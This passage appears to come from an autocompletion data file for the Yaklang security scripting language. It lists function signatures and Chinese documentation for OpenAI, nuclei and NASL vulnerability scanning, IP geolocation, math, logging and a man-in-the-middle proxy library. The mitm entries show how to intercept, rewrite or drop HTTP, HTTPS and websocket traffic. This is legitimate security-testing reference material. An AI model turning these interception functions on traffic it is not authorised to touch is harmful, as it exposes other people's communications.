              'functionParamType(i string) ConfigOption  doc:functionParamType 设置函数调用时的参数类型，默认为 "object"\n\nExample:\n```\nresultMap = openai.FunctionCall(\n"What is the weather like in Boston?",\n"get_current_weather",\n"Get the current weather in a given location",\nopenai.apiKey("sk-xxxx"),\nopenai.proxy("http://127.0.0.1:7890"),\nopenai.functionProperty("location", "string", "The city and state, e.g. San Francisco, CA"),\nopenai.functionRequired("location"))\n```\n',
          },
          {
            functionName: "domain(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'domain(i string) ConfigOption  doc:domain 设置 OpenAI的第三方加速域名，用于加速访问\n\nExample:\n```\nresult = openai.TranslateToChinese("Hello, world!", openai.apiKey("sk-xxx"), openai.domain("api.ai.yaklang.com"))\n```\n',
          },
          {
            functionName: "assistantMessage(${1:content /*type: string*/})",
            document: "",
            definitionStr:
              'assistantMessage(content string) ChatDetail  doc:assistantMessage 根据传入的内容构造并返回一个 OpenAI 助手信息\n\nExample:\n```\nd = openai.ChatEx(\n[\nopenai.userMessage("What is the weather like today?"),\nopenai.assistantMessage("72 degrees and sunny."),\nopenai.userMessage("What will the temperature be tomorrow?"),\n],\n)~\n```\n',
          },
          {
            functionName: "apiKey(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'apiKey(i string) ConfigOption  doc:apiKey 设置 OpenAI的API Key\n\nExample:\n```\nresult = openai.TranslateToChinese("Hello, world!", openai.apiKey("sk-xxx"))\n```\n',
          },
          {
            functionName:
              "TranslateToChinese(${1:data /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'TranslateToChinese(data string, opts ...ConfigOption) string  doc:TranslateToChinese 使用 OpenAI 的大语言模型将传入的字符串翻译为中文，还可以接收零个到多个配置选项，用于配置代理、API Key、模型等，返回翻译后的中文字符串\n\nExample:\n```\nresult = openai.TranslateToChinese("Hello, world!", openai.apiKey("sk-xxx"), openai.proxy("http://127.0.0.1:7890"))\n```\n',
          },
          {
            functionName: "NewSession(${1:opt...})",
            document: "",
            definitionStr: "NewSession(opt ...ConfigOption) *Session",
          },
          {
            functionName:
              "FunctionCall(${1:data /*type: string*/}, ${2:funcName /*type: string*/}, ${3:funcDesc /*type: string*/}, ${4:opts...})",
            document: "",
            definitionStr:
              "FunctionCall(data string, funcName string, funcDesc string, opts ...ConfigOption) map[string]any",
          },
          {
            functionName:
              "ChatEx(${1:messages /*type: []aispec.ChatDetail*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'ChatEx(messages []aispec.ChatDetail, opts ...ConfigOption) (aispec.ChatDetails, error)  doc:ChatEx 使用 OpenAI 的大语言模型进行对话，返回对话结果结构体与错误\n\n@param {[]ChatDetail} 聊天的消息上下文，可以通过openai.userMessage等创建\n\n@param {ConfigOption} ...opts 配置选项，用于配置代理、API Key、模型等\n\n@return {ChatDetails} 包含对话结果的结构体\n\n@return {error} 错误\n\nExample:\n```\nd = openai.ChatEx(\n[\nopenai.userMessage("What is the weather like in Boston?")\n],\nopenai.newFunction(\n"get_current_weather",\n"Get the current weather in a given location",\nopenai.functionProperty("location", "string", "The city and state, e.g. San Francisco, CA"),\nopenai.functionRequired("location"),\n),\nopenai.proxy("http://127.0.0.1:7890"),\n)~\nprintln(d.FunctionCallResult())\n```\n',
          },
          {
            functionName: "Chat(${1:data /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Chat(data string, opts ...ConfigOption) string  doc:Chat 使用 OpenAI 的大语言模型进行对话，返回对话结果\n\n@param {string} data 用户的提问或描述\n\n@param {ConfigOption} ...opts 配置选项，用于配置代理、API Key、模型等\n\nExample:\n```\nresult = openai.Chat("Hello, world!", openai.apiKey("sk-xxx"), openai.proxy("http://127.0.0.1:7890"))\n```\n',
          },
        ],
      },
      {
        libName: "nuclei",
        prefix: "nuclei.",
        functions: [
          {
            functionName: "workflows(${1:i...})",
            document: "",
            definitionStr: "workflows(i ...any) any",
          },
          {
            functionName: "version(${1:i...})",
            document: "",
            definitionStr: "version(i ...any) any",
          },
          {
            functionName: "verbose(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "verbose(b bool) ConfigOption",
          },
          {
            functionName: "updateTemplates(${1:i...})",
            document: "",
            definitionStr: "updateTemplates(i ...any) any",
          },
          {
            functionName: "timeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "timeout(i float64) lowhttp.LowhttpOpt",
          },
          {
            functionName: "templatesVersion(${1:i...})",
            document: "",
            definitionStr: "templatesVersion(i ...any) any",
          },
          {
            functionName: "templatesThreads(${1:i /*type: int*/})",
            document: "",
            definitionStr: "templatesThreads(i int) ConfigOption",
          },
          {
            functionName: "templatesDir(${1:i...})",
            document: "",
            definitionStr: "templatesDir(i ...any) any",
          },
          {
            functionName: "templates(${1:s...})",
            document: "",
            definitionStr: "templates(s ...string) ConfigOption",
          },
          {
            functionName: "templateList(${1:i...})",
            document: "",
            definitionStr: "templateList(i ...any) any",
          },
          {
            functionName:
              "tcpResultCallback(${1:handler /*type: func(i map[string]any)*/})",
            document: "",
            definitionStr:
              "tcpResultCallback(handler func(i map[string]any)) ConfigOption",
          },
          {
            functionName: "targetConcurrent(${1:i /*type: int*/})",
            document: "",
            definitionStr: "targetConcurrent(i int) ConfigOption",
          },
          {
            functionName: "tags(${1:f...})",
            document: "",
            definitionStr: "tags(f ...string) ConfigOption",
          },
          {
            functionName: "systemDnsResolver(${1:i...})",
            document: "",
            definitionStr: "systemDnsResolver(i ...any) any",
          },
          {
            functionName: "stopAtFirstMatch(${1:i...})",
            document: "",
            definitionStr: "stopAtFirstMatch(i ...any) any",
          },
          {
            functionName: "silent(${1:i...})",
            document: "",
            definitionStr: "silent(i ...any) any",
          },
          {
            functionName: "showBrowser(${1:i...})",
            document: "",
            definitionStr: "showBrowser(i ...any) any",
          },
          {
            functionName: "severity(${1:i...})",
            document: "",
            definitionStr: "severity(i ...any) any",
          },
          {
            functionName: "runtimeId(${1:id /*type: string*/})",
            document: "",
            definitionStr: "runtimeId(id string) ConfigOption",
          },
          {
            functionName: "reverseUrl(${1:i...})",
            document: "",
            definitionStr: "reverseUrl(i ...any) any",
          },
          {
            functionName: "retry(${1:retryTimes /*type: int*/})",
            document: "",
            definitionStr: "retry(retryTimes int) LowhttpOpt",
          },
          {
            functionName:
              "resultCallback(${1:handler /*type: func(i map[string]any)*/})",
            document: "",
            definitionStr:
              "resultCallback(handler func(i map[string]any)) ConfigOption",
          },
          {
            functionName: "reportingDB(${1:i...})",
            document: "",
            definitionStr: "reportingDB(i ...any) any",
          },
          {
            functionName: "reportingConfig(${1:i...})",
            document: "",
            definitionStr: "reportingConfig(i ...any) any",
          },
          {
            functionName: "rawTemplate(${1:b /*type: string*/})",
            document: "",
            definitionStr: "rawTemplate(b string) ConfigOption",
          },
          {
            functionName: "rateLimit(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "rateLimit(i float64) lowhttp.LowhttpOpt",
          },
          {
            functionName: "proxy(${1:proxy...})",
            document: "",
            definitionStr: "proxy(proxy ...string) LowhttpOpt",
          },
          {
            functionName: "pageTimeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "pageTimeout(i float64) lowhttp.LowhttpOpt",
          },
          {
            functionName: "output(${1:i...})",
            document: "",
            definitionStr: "output(i ...any) any",
          },
          {
            functionName: "noMeta(${1:i...})",
            document: "",
            definitionStr: "noMeta(i ...any) any",
          },
          {
            functionName: "noInteractsh(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "noInteractsh(b bool) ConfigOption",
          },
          {
            functionName: "noColor(${1:i...})",
            document: "",
            definitionStr: "noColor(i ...any) any",
          },
          {
            functionName: "newTemplates(${1:i...})",
            document: "",
            definitionStr: "newTemplates(i ...any) any",
          },
          {
            functionName: "mode(${1:s /*type: string*/})",
            document: "",
            definitionStr: "mode(s string) ConfigOption",
          },
          {
            functionName: "metrics(${1:i...})",
            document: "",
            definitionStr: "metrics(i ...any) any",
          },
          {
            functionName: "logFile(${1:i...})",
            document: "",
            definitionStr: "logFile(i ...any) any",
          },
          {
            functionName: "interactshTimeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr: "interactshTimeout(f float64) ConfigOption",
          },
          {
            functionName: "https(${1:https /*type: bool*/})",
            document: "",
            definitionStr: "https(https bool) LowhttpOpt",
          },
          {
            functionName: "http2(${1:Http2 /*type: bool*/})",
            document: "",
            definitionStr: "http2(Http2 bool) LowhttpOpt",
          },
          {
            functionName: "headless(${1:i...})",
            document: "",
            definitionStr: "headless(i ...any) any",
          },
          {
            functionName: "headers(${1:i...})",
            document: "",
            definitionStr: "headers(i ...any) any",
          },
          {
            functionName: "fuzzQueryTemplate(${1:s...})",
            document: "",
            definitionStr: "fuzzQueryTemplate(s ...string) ConfigOption",
          },
          {
            functionName: "fromPlugin(${1:fromPlugin /*type: string*/})",
            document: "",
            definitionStr: "fromPlugin(fromPlugin string) LowhttpOpt",
          },
          {
            functionName: "excludeTemplates(${1:s...})",
            document: "",
            definitionStr: "excludeTemplates(s ...string) ConfigOption",
          },
          {
            functionName: "excludeTags(${1:i...})",
            document: "",
            definitionStr: "excludeTags(i ...any) any",
          },
          {
            functionName:
              "exactTemplateIns(${1:script /*type: *schema.YakScript*/})",
            document: "",
            definitionStr:
              "exactTemplateIns(script *schema.YakScript) ConfigOption",
          },
          {
            functionName: "enableReverseConnection(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "enableReverseConnection(b bool) ConfigOption",
          },
          {
            functionName: "dnsResolver(${1:servers /*type: []string*/})",
            document: "",
            definitionStr: "dnsResolver(servers []string) LowhttpOpt",
          },
          {
            functionName: "debugResponse(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "debugResponse(b bool) ConfigOption",
          },
          {
            functionName: "debugRequest(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "debugRequest(b bool) ConfigOption",
          },
          {
            functionName: "debug(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "debug(b bool) ConfigOption",
          },
          {
            functionName: "customVulnFilter(${1:f /*type: filter.Filterable*/})",
            document: "",
            definitionStr: "customVulnFilter(f filter.Filterable) ConfigOption",
          },
          {
            functionName: "context(${1:c /*type: context.Context*/})",
            document: "",
            definitionStr: "context(c context.Context) ConfigOption",
          },
          {
            functionName: "bulkSize(${1:i /*type: int*/})",
            document: "",
            definitionStr: "bulkSize(i int) ConfigOption",
          },
          {
            functionName: "all(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "all(b bool) ConfigOption",
          },
          {
            functionName: "UpdatePoC(${1:proxy...})",
            document: "",
            definitionStr: "UpdatePoC(proxy ...string)",
          },
          {
            functionName: "UpdateDatabase(${1:nucleiDir...})",
            document: "",
            definitionStr: "UpdateDatabase(nucleiDir ...string) error",
          },
          {
            functionName: "ScanAuto(${1:items}, ${2:opt...})",
            document: "",
            definitionStr: "ScanAuto(items any, opt ...any)",
          },
          {
            functionName: "Scan(${1:target}, ${2:opt...})",
            document: "",
            definitionStr:
              "Scan(target any, opt ...any) (chan *tools.PocVul, error)",
          },
          {
            functionName: "RemoveDatabase()",
            document: "",
            definitionStr: "RemoveDatabase() error",
          },
          {
            functionName:
              "PullDatabase(${1:giturl /*type: string*/}, ${2:proxy...})",
            document: "",
            definitionStr:
              "PullDatabase(giturl string, proxy ...string) (string, error)",
          },
          {
            functionName: "PocVulToRisk(${1:p /*type: *PocVul*/})",
            document: "",
            definitionStr: "PocVulToRisk(p *PocVul) *schema.Risk",
          },
          {
            functionName: "GetPoCDir()",
            document: "",
            definitionStr: "GetPoCDir() string",
          },
          {
            functionName: "AllPoC(${1:defaultDirs...})",
            document: "",
            definitionStr:
              "AllPoC(defaultDirs ...string) ([]*templateDesc, error)",
          },
        ],
      },
      {
        libName: "nasl",
        prefix: "nasl.",
        functions: [
          {
            functionName: "riskHandle(${1:v1/*type: func (v1: any) */})",
            document: "",
            definitionStr:
              "func nasl.riskHandle(v1: func (v1: any) ) return (r0: func NaslScriptConfigOptFunc(v1: *script_core.NaslScriptConfig) )",
          },
          {
            functionName: "proxy(${1:v1/*type ...string*/})",
            document: "",
            definitionStr:
              "func nasl.proxy(v1 ...string) return (r0: func NaslScriptConfigOptFunc(v1: *script_core.NaslScriptConfig) )",
          },
          {
            functionName: "plugin(${1:v1/*type ...string*/})",
            document: "",
            definitionStr:
              "func nasl.plugin(v1 ...string) return (r0: func NaslScriptConfigOptFunc(v1: *script_core.NaslScriptConfig) )",
          },
          {
            functionName: "family(${1:v1/*type: string*/})",
            document: "",
            definitionStr:
              "func nasl.family(v1: string) return (r0: func NaslScriptConfigOptFunc(v1: *script_core.NaslScriptConfig) )",
          },
          {
            functionName: "conditions(${1:v1/*type ...any*/})",
            document: "",
            definitionStr:
              "func nasl.conditions(v1 ...any) return (r0: func NaslScriptConfigOptFunc(v1: *script_core.NaslScriptConfig) )",
          },
          {
            functionName: "UpdateDatabase(${1:v1/*type: string*/})",
            document: "",
            definitionStr: "`func nasl.UpdateDatabase(v1: string)`",
          },
          {
            functionName:
              "ScanTarget(${1:v1/*type: string*/}, ${2:v2/*type ...script_core.NaslScriptConfigOptFunc*/})",
            document: "",
            definitionStr:
              "func nasl.ScanTarget(v1: string, v2 ...script_core.NaslScriptConfigOptFunc) return (r0: chan *script_core.NaslKBs, r1: error)",
          },
          {
            functionName:
              "Scan(${1:v1/*type: string*/}, ${2:v2/*type: string*/}, ${3:v3/*type ...script_core.NaslScriptConfigOptFunc*/})",
            document: "",
            definitionStr:
              "func nasl.Scan(v1: string, v2: string, v3 ...script_core.NaslScriptConfigOptFunc) return (r0: chan *script_core.NaslKBs)",
          },
          {
            functionName: "RemoveDatabase()",
            document: "",
            definitionStr: "func nasl.RemoveDatabase() return (r0: error)",
          },
          {
            functionName: "QueryAllScripts(${1:v1/*type ...any*/})",
            document: "",
            definitionStr:
              "func nasl.QueryAllScripts(v1 ...any) return (r0: []*script_core.NaslScriptInfo)",
          },
        ],
      },
      {
        libName: "mmdb",
        prefix: "mmdb.",
        functions: [
          {
            functionName:
              "QueryIPCity(${1:r /*type: *maxminddb.Reader*/}, ${2:ip /*type: string*/})",
            document: "",
            definitionStr:
              "QueryIPCity(r *maxminddb.Reader, ip string) (*geo.City, error)",
          },
          {
            functionName: "Open(${1:file /*type: string*/})",
            document: "",
            definitionStr: "Open(file string) (*Reader any, error any)",
          },
        ],
      },
      {
        libName: "mitm",
        prefix: "mitm.",
        functions: [
          {
            functionName: "wsforcetext(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "wsforcetext(b bool) MitmConfigOpt  doc:wsforcetext 是一个选项函数，用于强制指定中间人代理服务器的 websocket 劫持的数据帧转换为文本帧，默认为false\n\n! 已弃用\n\nExample:\n```\nmitm.Start(8080, mitm.wsforcetext(true))\n```\n",
          },
          {
            functionName: "wscallback(${1:f /*type: func([]byte, bool) any*/})",
            document: "",
            definitionStr:
              "wscallback(f func([]byte, bool) any) MitmConfigOpt  doc:wscallback 是一个选项函数，用于指定中间人代理服务器的 websocket 劫持函数，当接收到 websocket 请求或响应后，会调用该回调函数\n\n该回调函数的第一个参数是请求或响应的内容\n\n第二个参数是一个布尔值，用于指示该内容是请求还是响应，true 表示请求，false 表示响应\n\n通过该回调函数的返回值，可以修改请求或响应的内容\n\nExample:\n```\nmitm.Start(8080, mitm.wscallback(func(data, isRequest) { println(data); return data }))\n```\n",
          },
          {
            functionName: "useDefaultCA(${1:t /*type: bool*/})",
            document: "",
            definitionStr:
              "useDefaultCA(t bool) MitmConfigOpt  doc:useDefaultCA 是一个选项函数，用于指定中间人代理服务器是否使用内置的证书和私钥，默认为true\n\n默认的证书与私钥路径：~/yakit-projects/yak-mitm-ca.crt 和 ~/yakit-projects/yak-mitm-ca.key\n\nExample:\n```\nmitm.Start(8080, mitm.useDefaultCA(true))\n```\n",
          },
          {
            functionName:
              "rootCA(${1:cert /*type: []byte*/}, ${2:key /*type: []byte*/})",
            document: "",
            definitionStr:
              "rootCA(cert []byte, key []byte) MitmConfigOpt  doc:rootCA 是一个选项函数，用于指定中间人代理服务器的根证书和私钥\n\nExample:\n```\nmitm.Start(8080, mitm.rootCA(cert, key))\n```\n",
          },
          {
            functionName: "maxContentLength(${1:i /*type: int*/})",
            document: "",
            definitionStr:
              "maxContentLength(i int) MitmConfigOpt  doc:maxContentLength 是一个选项函数，用于指定中间人代理服务器的最大的请求和响应内容长度，默认为10MB\n\nExample:\n```\nmitm.Start(8080, mitm.maxContentLength(100 * 1000 * 1000))\n```\n",
          },
          {
            functionName: "isTransparent(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "isTransparent(b bool) MitmConfigOpt  doc:isTransparent 是一个选项函数，用于指定中间人代理服务器是否开启透明劫持模式，默认为false\n\n在开启透明模式下，所有流量都会被默认转发，所有的回调函数都会被忽略\n\nExample:\n```\nmitm.Start(8080, mitm.isTransparent(true))\n```\n",
          },
          {
            functionName: "host(${1:host /*type: string*/})",
            document: "",
            definitionStr:
              'host(host string) MitmConfigOpt  doc:host 是一个选项函数，用于指定中间人代理服务器的监听地址，默认为空，即监听所有网卡\n\nExample:\n```\nmitm.Start(8080, mitm.host("127.0.0.1"))\n```\n',
          },
          {
            functionName:
              "hijackHTTPResponseEx(${1:h /*type: func(bool, string, []byte, []byte, func([]byte), func())*/})",
            document: "",
            definitionStr:
              'hijackHTTPResponseEx(h func(bool, string, []byte, []byte, func([]byte), func())) MitmConfigOpt  doc:hijackHTTPResponseEx 是一个选项函数，用于指定中间人代理服务器的响应劫持函数，当接收到响应后，会调用该回调函数\n\n通过调用该回调函数的第五个参数，可以修改响应内容，通过调用该回调函数的第六个参数，可以丢弃响应\n\n它与 hijackHTTPResponse 的区别在于，它可以获取到原始请求报文\n\nExample:\n```\nmitm.Start(8080, mitm.hijackHTTPResponseEx(func(isHttps, urlStr, req, rsp, modified, dropped) {\n// 修改响应体为hijacked\nrsp = poc.ReplaceBody(rsp, b"hijacked", false)\nmodified(rsp)\n}\n))\n```\n',
          },
          {
            functionName:
              "hijackHTTPResponse(${1:h /*type: func(isHttps bool, u string, rsp []byte, modified func([]byte), dropped func())*/})",
            document: "",
            definitionStr:
              'hijackHTTPResponse(h func(isHttps bool, u string, rsp []byte, modified func([]byte), dropped func())) MitmConfigOpt  doc:hijackHTTPResponse 是一个选项函数，用于指定中间人代理服务器的响应劫持函数，当接收到响应后，会调用该回调函数\n\n通过调用该回调函数的第四个参数，可以修改响应内容，通过调用该回调函数的第五个参数，可以丢弃响应\n\nExample:\n```\nmitm.Start(8080, mitm.hijackHTTPResponse(func(isHttps, urlStr, rsp, modified, dropped) {\n// 修改响应体为hijacked\nrsp = poc.ReplaceBody(rsp, b"hijacked", false)\nmodified(rsp)\n}\n))\n```\n',
          },
          {
            functionName:
              "hijackHTTPRequest(${1:h /*type: func(isHttps bool, u string, req []byte, modified func([]byte), dropped func())*/})",
            document: "",
            definitionStr:
              'hijackHTTPRequest(h func(isHttps bool, u string, req []byte, modified func([]byte), dropped func())) MitmConfigOpt  doc:hijackHTTPRequest 是一个选项函数，用于指定中间人代理服务器的请求劫持函数，当接收到请求后，会调用该回调函数\n\n通过调用该回调函数的第四个参数，可以修改请求内容，通过调用该回调函数的第五个参数，可以丢弃请求\n\nExample:\n```\nmitm.Start(8080, mitm.hijackHTTPRequest(func(isHttps, urlStr, req, modified, dropped) {\n// 添加一个额外的请求头\nreq = poc.ReplaceHTTPPacketHeader(req, "AAA", "BBB")\nmodified(req)\n}\n))\n```\n',
          },
          {
            functionName: "gmtlsPrefer(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "gmtlsPrefer(b bool) MitmConfigOpt  doc:gmtlsPrefer 是一个选项参数，用于指定中间人代理服务器是否优先使用 GMTLS 劫持模式，默认为false\n\n在开启 GMTLS 劫持模式下，中间人代理服务器会优先使用 GMTLS 劫持模式\n\nExample:\n```\nmitm.Start(8080, mitm.gmtlsPrefer(true))\n```\n",
          },
          {
            functionName: "gmtlsOnly(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "gmtlsOnly(b bool) MitmConfigOpt  doc:gmtlsOnly 是一个选项参数，用于指定中间人代理服务器是否只使用 GMTLS 劫持模式，默认为false\n\n在开启 GMTLS 劫持模式下，中间人代理服务器只会使用 GMTLS 劫持模式\n\nExample:\n```\nmitm.Start(8080, mitm.gmtlsOnly(true))\n```\n",
          },
          {
            functionName: "gmtls(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "gmtls(b bool) MitmConfigOpt  doc:gmtls 是一个选项参数，用于指定中间人代理服务器是否开启 GMTLS 劫持模式，默认为false\n\n在开启 GMTLS 劫持模式下，中间人代理服务器会劫持所有的 GMTLS 流量\n\nExample:\n```\nmitm.Start(8080, mitm.gmtls(true))\n```\n",
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr:
              "context(ctx context.Context) MitmConfigOpt  doc:context 是一个选项函数，用于指定中间人代理服务器的上下文\n\nExample:\n```\nmitm.Start(8080, mitm.context(context.Background()))\n```\n",
          },
          {
            functionName:
              "callback(${1:f /*type: func(bool, string, *http.Request, *http.Response)*/})",
            document: "",
            definitionStr:
              "callback(f func(bool, string, *http.Request, *http.Response)) MitmConfigOpt  doc:callback 是一个选项函数，用于指定中间人代理服务器的回调函数，当接收到请求和响应后，会调用该回调函数\n\nExample:\n```\nmitm.Start(8080, mitm.callback(func(isHttps, urlStr, req, rsp) { http.dump(req); http.dump(rsp)  }))\n```\n",
          },
          {
            functionName: "Start(${1:port /*type: int*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'Start(port int, opts ...MitmConfigOpt) error  doc:Start 启动一个 MITM (中间人)代理服务器，它的第一个参数是端口，接下来可以接收零个到多个选项函数，用于影响中间人代理服务器的行为\n\n如果没有指定 CA 证书和私钥，那么将使用内置的证书和私钥\n\nExample:\n```\nmitm.Start(8080, mitm.host("127.0.0.1"), mitm.callback(func(isHttps, urlStr, req, rsp) { http.dump(req); http.dump(rsp)  })) // 启动一个中间人代理服务器，并将请求和响应打印到标准输出\n```\n',
          },
          {
            functionName:
              "Bridge(${1:port}, ${2:downstreamProxy /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'Bridge(port any, downstreamProxy string, opts ...MitmConfigOpt) error  doc:Bridge 启动一个 MITM (中间人)代理服务器，它的第一个参数是端口，第二个参数是下游代理服务器地址，接下来可以接收零个到多个选项函数，用于影响中间人代理服务器的行为\n\nBridge 与 Start 类似，但略有不同，Bridge可以指定下游代理服务器地址，同时默认会在接收到请求和响应时打印到标准输出\n\n如果没有指定 CA 证书和私钥，那么将使用内置的证书和私钥\n\nExample:\n```\nmitm.Bridge(8080, "", mitm.host("127.0.0.1"), mitm.callback(func(isHttps, urlStr, req, rsp) { http.dump(req); http.dump(rsp)  })) // 启动一个中间人代理服务器，并将请求和响应打印到标准输出\n```\n',
          },
        ],
      },
      {
        libName: "math",
        prefix: "math.",
        functions: [
          {
            functionName: "Tan(${1:x /*type: float64*/})",
            document: "",
            definitionStr: "Tan(x float64) float64  doc:Tan 三角函数 Tan\n",
          },
          {
            functionName: "SqrtPi",
            document: "math.SqrtPi: float64",
            definitionStr: "math.SqrtPi: float64",
          },
          {
            functionName: "SqrtE",
            document: "math.SqrtE: float64",
            definitionStr: "math.SqrtE: float64",
          },
          {
            functionName: "Sqrt2",
            document: "math.Sqrt2: float64",
            definitionStr: "math.Sqrt2: float64",
          },
          {
            functionName: "Sqrt(${1:x /*type: float64*/})",
            document: "",
            definitionStr:
              "Sqrt(x float64) float64  doc:Sqrt 返回一个数的平方根\n\n如果x < 0，返回NaN\n\nExample:\n```\nmath.Sqrt(4) // 2\nmath.Sqrt(-1) // NaN\n```\n",
          },
          {
            functionName: "Sinh(${1:x /*type: float64*/})",
            document: "",
            definitionStr: "Sinh(x float64) float64  doc:Sinh 双曲正弦函数\n",
          },
          {
            functionName: "Sin(${1:x /*type: float64*/})",
            document: "",
            definitionStr: "Sin(x float64) float64  doc:Sin 三角函数 sin\n",
          },
          {
            functionName: "RoundToEven(${1:x /*type: float64*/})",
            document: "",
            definitionStr:
              "RoundToEven(x float64) float64  doc:RoundToEven 返回四舍五入到最近的偶整数\n\nExample:\n```\nmath.RoundToEven(1.5) // 2\nmath.RoundToEven(2.5) // 2\nmath.RoundToEven(3.5) // 4\nmath.RoundToEven(4.5) // 4\n```\n",
          },
          {
            functionName: "Round(${1:x /*type: float64*/})",
            document: "",
            definitionStr:
              "Round(x float64) float64  doc:Round 返回四舍五入到最近的整数\n\n存在一些特殊情况：Round(±0) = ±0，Round(±Inf) = ±Inf，Round(NaN) = NaN\n\nExample:\n```\nmath.Round(1.5) // 2\nmath.Round(1.4) // 1\n```\n",
          },
          {
            functionName: "Pow10(${1:n /*type: int*/})",
            document: "",
            definitionStr:
              "Pow10(n int) float64  doc:Pow10 返回10的n次方\n\nExample:\n```\nmath.Pow10(2) // 100\nmath.Pow10(-1) // 0.1\n```\n",
          },
          {
            functionName:
              "Pow(${1:x /*type: float64*/}, ${2:y /*type: float64*/})",
            document: "",
            definitionStr:
              "Pow(x float64, y float64) float64  doc:Pow 返回x的y次方\n\nExample:\n```\nmath.Pow(2, 3) // 8\nmath.Pow(2, -1) // 0.5\n```\n",
          },
          {
            functionName: "Pi",
            document: "math.Pi: float64",
            definitionStr: "math.Pi: float64",
          },
          {
            functionName: "NaN()",
            document: "",
            definitionStr:
              "NaN() float64  doc:NaN 返回一个IEEE-574 “非数字”的值\n\nExample:\n```\nmath.NaN()\n```\n",
          },
          {
            functionName: "Ln2",
            document: "math.Ln2: float64",
            definitionStr: "math.Ln2: float64",
          },
          {
            functionName: "Ln10",
            document: "math.Ln10: float64",
            definitionStr: "math.Ln10: float64",
          },
          {
            functionName: "IsNaN(${1:x /*type: float64*/})",
            document: "",
            definitionStr:
              "IsNaN(x float64) bool  doc:IsNaN 判断一个数是否是NaN\n\nExample:\n```\nmath.IsNaN(1) // false\nmath.IsNaN(math.NaN()) // true\n```\n",
          },
          {
            functionName: "Floor(${1:x /*type: float64*/})",
            document: "",
            definitionStr:
              "Floor(x float64) float64  doc:Floor 返回不大于x的最大整数\n\nExample:\n```\nmath.Floor(1.5) // 1\nmath.Floor(-1.5) // -2\n```\n",
          },
          {
            functionName: "E",
            document: "math.E: float64",
            definitionStr: "math.E: float64",
          },
          {
            functionName: "Cos(${1:x /*type: float64*/})",
            document: "",
            definitionStr: "Cos(x float64) float64  doc:Cos 三角函数 Cos\n",
          },
          {
            functionName: "Ceil(${1:x /*type: float64*/})",
            document: "",
            definitionStr:
              "Ceil(x float64) float64  doc:Ceil 返回不小于x的最小整数\n\nExample:\n```\nmath.Ceil(1.5) // 2\nmath.Ceil(-1.5) // -1\n```\n",
          },
          {
            functionName: "Atan(${1:x /*type: float64*/})",
            document: "",
            definitionStr: "Atan(x float64) float64  doc:Atan 反三角函数 Atan\n",
          },
          {
            functionName: "Asin(${1:x /*type: float64*/})",
            document: "",
            definitionStr: "Asin(x float64) float64  doc:Asin 反三角函数 Asin\n",
          },
          {
            functionName: "Acos(${1:x /*type: float64*/})",
            document: "",
            definitionStr: "Acos(x float64) float64  doc:Acos 反三角函数 Acos\n",
          },
          {
            functionName: "Abs(${1:x /*type: float64*/})",
            document: "",
            definitionStr:
              "Abs(x float64) float64  doc:Abs 返回x的绝对值\n\nExample:\n```\nmath.Abs(-1) // 1\nmath.Abs(1) // 1\n```\n",
          },
        ],
      },
      {
        libName: "log",
        prefix: "log.",
        functions: [
          {
            functionName: "warn(${1:raw /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr: "warn(raw string, args ...any)",
          },
          {
            functionName: "setLevel(${1:i})",
            document: "",
            definitionStr:
              'setLevel(i any)  doc:loglevel 根据传入的字符串设置日志级别\n\ndisable: 禁用所有日志, fatal: 致命错误, error: 错误, warning: 警告, info: 信息, debug: 调试\n\nExample:\n```\nloglevel("fatal")\n```\n',
          },
          {
            functionName: "info(${1:format /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr:
              "info(format string, args ...any)  doc:Infof will print when logger's Level is info or debug.\n",
          },
          {
            functionName: "error(${1:format /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr:
              "error(format string, args ...any)  doc:Errorf will print only when logger's Level is error, warn, info or debug.\n",
          },
          {
            functionName: "debug(${1:format /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr:
              "debug(format string, args ...any)  doc:Debugf will print when logger's Level is debug.\n",
          },
          {
            functionName: "Warn(${1:raw /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr: "Warn(raw string, args ...any)",
          },
          {
            functionName: "SetLevel(${1:i})",
            document: "",
            definitionStr:
              'SetLevel(i any)  doc:loglevel 根据传入的字符串设置日志级别\n\ndisable: 禁用所有日志, fatal: 致命错误, error: 错误, warning: 警告, info: 信息, debug: 调试\n\nExample:\n```\nloglevel("fatal")\n```\n',
          },
          {
            functionName: "Info(${1:format /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr:
              "Info(format string, args ...any)  doc:Infof will print when logger's Level is info or debug.\n",
          },
          {
            functionName: "Error(${1:format /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr:
              "Error(format string, args ...any)  doc:Errorf will print only when logger's Level is error, warn, info or debug.\n",
          },
          {
            functionName: "Debug(${1:format /*type: string*/}, ${2:args...})",
            document: "",
            definitionStr:
              "Debug(format string, args ...any)  doc:Debugf will print when logger's Level is debug.\n",
          },
        ],
      },
      {
        libName: "ldap",
        prefix: "ldap.",
        functions: [
          {
            functionName: "username(${1:i /*type: string*/})",
            document: "",
            definitionStr: "username(i string) func(config *ldapClientConfig)",
          },
          {
            functionName: "port(${1:i /*type: int*/})",
            document: "",
